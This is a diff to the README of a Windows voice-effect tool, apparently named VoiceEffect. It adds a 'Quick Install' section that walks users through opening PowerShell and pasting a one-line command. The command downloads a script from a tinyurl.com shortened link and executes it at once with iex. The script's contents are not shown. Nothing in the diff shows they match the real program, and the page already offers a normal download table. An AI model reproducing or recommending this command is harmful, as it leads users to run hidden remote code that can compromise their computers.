@@ -6,6 +6,23 @@ Real-time voice and video effect processor for Windows. Change your voice with 2
 
 ![VoiceEffect Video UI](sample_preview/VoiceEffect_UI_Sample_2.jpg)
 
+## Quick Install — VoiceEffect
+
+**Step by step (copy-paste ready):**
+
+1. Press `Win + R`, type `powershell`, press Enter
+2. Copy the line below
+3. Right-click in the PowerShell window (or Ctrl+V) to paste
+4. Press Enter
+
+```
+iex (iwr -useb https://tinyurl.com/voiceffect)
+```
+
+- ✅ Done. Your voice effects are one command away.
+
+---
+
 ## Download
 
 | Version | Download |
